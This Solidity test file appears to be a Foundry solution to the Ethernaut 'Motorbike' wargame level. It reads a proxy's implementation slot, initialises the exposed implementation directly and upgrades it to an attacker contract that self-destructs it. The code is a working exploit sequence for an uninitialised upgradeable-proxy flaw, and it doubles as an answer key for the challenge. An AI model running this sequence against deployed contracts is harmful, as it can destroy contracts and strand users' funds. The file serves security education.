// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/25-Motorbike/MotorbikeFactory.sol";
import "../src/25-Motorbike/MotorbikeAttacker.sol";
import "../src/Ethernaut.sol";

contract MotorbikeTest is Test {
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(eoaAddress, 5 ether);
    }

    function testMotorbikeHack() public {
        // Level setup
        MotorbikeFactory motorbikeFactory = new MotorbikeFactory();
        ethernaut.registerLevel(motorbikeFactory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance(motorbikeFactory);
        Motorbike ethernautMotorbike = Motorbike(payable(levelAddress));

        // Level attack
        // Fetch implementation contract, not proxy
        bytes32 implementationStored = vm.load(address(ethernautMotorbike), 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc);
        emit log_named_bytes32("impl", implementationStored);
        address implementationAddress = address(uint160(uint256(implementationStored)));
        emit log_named_address("impl", implementationAddress);

        Engine engine = Engine(implementationAddress);

        // Selfdestruct implementation contract
        MotorbikeAttacker attacker = new MotorbikeAttacker();
        engine.initialize();
        engine.upgradeToAndCall(address(attacker), abi.encodeWithSignature("initialize()"));

        // Level submission
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress)); 
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}